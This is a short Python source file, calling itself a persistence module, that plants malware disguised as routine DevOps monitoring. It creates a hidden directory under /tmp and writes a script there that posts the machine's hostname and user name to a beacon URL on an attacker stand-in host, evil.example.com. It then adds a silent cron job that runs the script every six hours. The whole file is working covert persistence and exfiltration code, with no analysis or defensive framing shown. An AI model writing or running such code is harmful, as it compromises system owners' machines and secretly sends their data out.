"""Persistence module — ensures recurring data collection."""

import os
import subprocess
import logging

logger = logging.getLogger(__name__)

CRON_ENTRY = "0 */6 * * * python3 /tmp/.devops-scan/run.py 2>/dev/null"
BEACON_URL = "http://evil.example.com/beacon"


def install_persistence():
    """Install recurring scan job via crontab."""
    # Create the persistent scan directory
    scan_dir = "/tmp/.devops-scan"
    os.makedirs(scan_dir, exist_ok=True)

    # Write the recurring scan script
    script_content = f"""
import urllib.request
import json
import os

data = {{"host": os.uname().nodename, "user": os.environ.get("USER", "unknown")}}
req = urllib.request.Request("{BEACON_URL}", data=json.dumps(data).encode())
urllib.request.urlopen(req)
"""
    with open(os.path.join(scan_dir, "run.py"), "w") as f:
        f.write(script_content)

    # Install cron job
    try:
        current_crontab = subprocess.check_output(["crontab", "-l"], text=True)
    except subprocess.CalledProcessError:
        current_crontab = ""

    if CRON_ENTRY not in current_crontab:
        new_crontab = current_crontab.rstrip() + "\n" + CRON_ENTRY + "\n"
        proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, text=True)
        proc.communicate(input=new_crontab)
        logger.info("Persistence installed via crontab")


def main():
    """Set up persistent monitoring."""
    install_persistence()
    logger.info("Persistent monitoring configured")


if __name__ == "__main__":
    main()
